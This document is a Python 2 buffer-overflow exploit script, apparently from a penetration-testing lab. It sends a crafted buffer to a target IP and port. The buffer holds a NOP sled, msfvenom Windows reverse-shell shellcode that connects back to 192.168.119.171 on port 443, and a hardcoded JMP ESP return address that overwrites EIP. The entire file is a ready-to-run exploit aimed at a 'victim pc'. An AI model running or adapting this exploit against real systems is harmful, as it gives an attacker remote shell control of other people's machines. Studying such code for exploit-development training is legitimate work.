# coding: utf-8
#!/usr/bin/python


import sys, argparse, socket


# function definitions
def sc_getter():

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.171 LPORT=443 -f c -b "\x00\x3b\x45"
    sc = ("\xdb\xd1\xbb\x4c\xf4\x41\xf9\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x5a\x17\x83\xea\xfc\x03\x16\xe7\xa3\x0c\x5a\xef\xa6"
"\xef\xa2\xf0\xc6\x66\x47\xc1\xc6\x1d\x0c\x72\xf7\x56\x40\x7f"
"\x7c\x3a\x70\xf4\xf0\x93\x77\xbd\xbf\xc5\xb6\x3e\x93\x36\xd9"
"\xbc\xee\x6a\x39\xfc\x20\x7f\x38\x39\x5c\x72\x68\x92\x2a\x21"
"\x9c\x97\x67\xfa\x17\xeb\x66\x7a\xc4\xbc\x89\xab\x5b\xb6\xd3"
"\x6b\x5a\x1b\x68\x22\x44\x78\x55\xfc\xff\x4a\x21\xff\x29\x83"
"\xca\xac\x14\x2b\x39\xac\x51\x8c\xa2\xdb\xab\xee\x5f\xdc\x68"
"\x8c\xbb\x69\x6a\x36\x4f\xc9\x56\xc6\x9c\x8c\x1d\xc4\x69\xda"
"\x79\xc9\x6c\x0f\xf2\xf5\xe5\xae\xd4\x7f\xbd\x94\xf0\x24\x65"
"\xb4\xa1\x80\xc8\xc9\xb1\x6a\xb4\x6f\xba\x87\xa1\x1d\xe1\xcf"
"\x06\x2c\x19\x10\x01\x27\x6a\x22\x8e\x93\xe4\x0e\x47\x3a\xf3"
"\x71\x72\xfa\x6b\x8c\x7d\xfb\xa2\x4b\x29\xab\xdc\x7a\x52\x20"
"\x1c\x82\x87\xe7\x4c\x2c\x78\x48\x3c\x8c\x28\x20\x56\x03\x16"
"\x50\x59\xc9\x3f\xfb\xa0\x9a\xff\x54\xdd\xf1\x68\xa7\x21\x07"
"\xd2\x2e\xc7\x6d\x34\x67\x50\x1a\xad\x22\x2a\xbb\x32\xf9\x57"
"\xfb\xb9\x0e\xa8\xb2\x49\x7a\xba\x23\xba\x31\xe0\xe2\xc5\xef"
"\x8c\x69\x57\x74\x4c\xe7\x44\x23\x1b\xa0\xbb\x3a\xc9\x5c\xe5"
"\x94\xef\x9c\x73\xde\xab\x7a\x40\xe1\x32\x0e\xfc\xc5\x24\xd6"
"\xfd\x41\x10\x86\xab\x1f\xce\x60\x02\xee\xb8\x3a\xf9\xb8\x2c"
"\xba\x31\x7b\x2a\xc3\x1f\x0d\xd2\x72\xf6\x48\xed\xbb\x9e\x5c"
"\x96\xa1\x3e\xa2\x4d\x62\x4e\xe9\xcf\xc3\xc7\xb4\x9a\x51\x8a"
"\x46\x71\x95\xb3\xc4\x73\x66\x40\xd4\xf6\x63\x0c\x52\xeb\x19"
"\x1d\x37\x0b\x8d\x1e\x12")

    return sc

def buffer_gen(bytes_to_send, eip, evil):                   

    # for testing placing interrupts at the same length as the shellcode
    # comment for production : 
    #evil = "\xCC" * len(evil)
    
    # sc payload 
    buf = "\x90" * 16
    buf += evil 

    # more noop until we hit the EIP offset
    buf += '\x90' * (eip - 16 - len(evil))
    
    # JMP ESP @ 1480113D (at the EIP offset)
    buf += "\x3D\x11\x80\x14" # little endian
    
    # JMP ECX
    buf += "\xff\xe1"

    # add in the rest to fill in the bytes to simulate crash
    buf += "C" * (bytes_to_send - len(buf))
    
    return buf

def socket_setup(ip, port):
    # socket creatation
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
   # connecting
    s.connect((ip, port))
    return s

def main(input_tuple):          # Input tuple has the following structure: (ip, port, bytes_to_send, eip_offset)
    try:
        s = socket_setup(input_tuple[0], input_tuple[1])

        buf = buffer_gen(input_tuple[2], input_tuple[3], sc_getter())

        #print "sending buffer: ", buf
        s.send(buf)
        s.close()

        print "\nSent!"

    except Exception as e:

        print "\n[!] Could not connect"
        print e
        sys.exit()

# script execution
if __name__ == "__main__":
    # user input
    program_description = "The program inputs ip and port of the victim pc EIP offset, and bytes to crash to FULLY exploit the vuln program. Will need to edit script to change shellcode"
    parser = argparse.ArgumentParser(program_description)
    parser.add_argument("target_ip", help="Target IP")
    parser.add_argument("target_port", type=int, help="Target Port")
    parser.add_argument("eip_offset", type=int, help="EIP offset at the moment of crash")
    parser.add_argument("bytes_to_send", type=int, help="bytes to send to crash the program")
    args = parser.parse_args()

    # global parameters
    user_input = (args.target_ip, args.target_port, args.bytes_to_send, args.eip_offset)


    main(user_input)        # calling main function

